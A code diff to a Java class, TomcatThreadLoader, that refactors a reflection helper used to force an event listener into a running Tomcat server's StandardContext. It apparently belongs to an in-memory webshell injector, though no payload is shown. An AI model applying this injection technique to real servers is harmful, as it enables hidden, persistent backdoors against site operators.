@@ -97,7 +97,7 @@ public class TomcatThreadLoader {
             setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
         } else {
             // 7 8 9 10
-            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
+            invokeMethod(standardContext.getClass(), standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
         }
         flag = new Boolean(true);
     }
@@ -175,13 +175,8 @@ public class TomcatThreadLoader {
         field.set(obj, value);
     }
 
-    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
-        try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
-        }
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
